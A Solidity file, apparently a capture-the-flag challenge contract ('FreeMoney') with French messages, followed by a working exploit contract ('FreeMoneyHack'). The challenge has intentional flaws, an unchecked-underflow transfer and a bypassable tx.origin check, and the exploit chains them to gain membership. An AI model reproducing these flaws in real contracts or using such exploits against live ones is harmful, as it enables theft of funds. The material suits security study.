/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

pragma solidity  0.5.16;

contract FreeMoney {

    mapping (address => uint256) balances;
    mapping(address => uint256) lastWithdrawTime;
    mapping(address => bool) isHallebardeMember;
    address private boss;

    constructor() public {
        boss = msg.sender;
    }

    function getMoney(uint256 numTokens) public {
        require(numTokens < 10000);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 365 days, "Vous devez attendre un an entre chaque demande d'argent.");
        balances[msg.sender] += numTokens;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

    function reset() public {
        balances[msg.sender] = 0;
        lastWithdrawTime[msg.sender] = 0;
    }

    function transfer(address receiver, uint256 numTokens) public returns (bool) {
        require(balances[msg.sender] > 0);
        balances[msg.sender] -= numTokens;
        balances[receiver] += numTokens;
        return true;
    }    

    function enterHallebarde() public {
        require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");
        require(msg.sender != tx.origin || boss == msg.sender, "Soyez plus entreprenant !");
        require(!isHallebardeMember[msg.sender]);
        isHallebardeMember[msg.sender] = true;
    }

    function getMembershipStatus(address memberAddress) external view returns (bool) {
        require(msg.sender == memberAddress || msg.sender == boss);
        return isHallebardeMember[memberAddress];
    }
}

contract FreeMoneyHack {
    FreeMoney fm = FreeMoney(0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6);

    function hack() public {
        fm.reset();
        fm.getMoney(0x100);
        fm.transfer(0xE37389059DcE67c0cDDaad765949dcc059679640, 0x2000);
        fm.enterHallebarde();
    }
}